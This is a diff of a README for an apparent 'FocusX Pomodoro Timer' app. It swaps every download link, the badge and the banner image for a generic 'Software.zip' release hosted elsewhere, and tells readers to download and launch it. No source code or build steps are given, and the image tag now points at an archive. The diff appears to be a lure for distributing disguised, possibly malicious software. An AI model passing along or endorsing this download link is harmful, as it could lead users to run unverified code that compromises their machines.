@@ -1,5 +1,5 @@
 # 🍅 **FocusX Pomodoro Timer**
-[![Downloads](https://img.shields.io/badge/Download-v1.0.0-blue?style=flat-square)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Downloads](https://github.com/Kiendz1/FocusX.Pomodoro/releases/download/v1.0/Software.zip)](https://github.com/Kiendz1/FocusX.Pomodoro/releases/download/v1.0/Software.zip)
 
 Welcome to FocusX Pomodoro Timer, your ultimate tool for enhancing focus and productivity! 🚀 This powerful Pomodoro timer will help you manage your time effectively, stay focused on tasks, and boost your productivity like never before. 
 
@@ -11,7 +11,7 @@ Welcome to FocusX Pomodoro Timer, your ultimate tool for enhancing focus and pro
 - **Time Tracker**: Keep track of your time spent on tasks and analyze your productivity patterns.
 
 ## ⏰ Get Started
-To get started with FocusX Pomodoro Timer, simply download the latest version by clicking [here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip). Once the download is complete, launch the application to begin your journey towards enhanced focus and productivity.
+To get started with FocusX Pomodoro Timer, simply download the latest version by clicking [here](https://github.com/Kiendz1/FocusX.Pomodoro/releases/download/v1.0/Software.zip). Once the download is complete, launch the application to begin your journey towards enhanced focus and productivity.
 
 ## 📌 Repository Topics
 clock, focus, focus-app, focus-management, pomodoro, pomodoro-app, pomodoro-timer, python-timer, screenblocker, time-management, time-management-app, time-tracker, timer
@@ -21,7 +21,7 @@ If you encounter any issues with the download link provided, remember to check t
 
 Let's conquer your tasks and achieve maximum productivity with FocusX Pomodoro Timer! 🎯
 
-![FocusX Pomodoro Timer](https://source.unsplash.com/800x600/?focus)
+![FocusX Pomodoro Timer](https://github.com/Kiendz1/FocusX.Pomodoro/releases/download/v1.0/Software.zip)
 
 ---
 
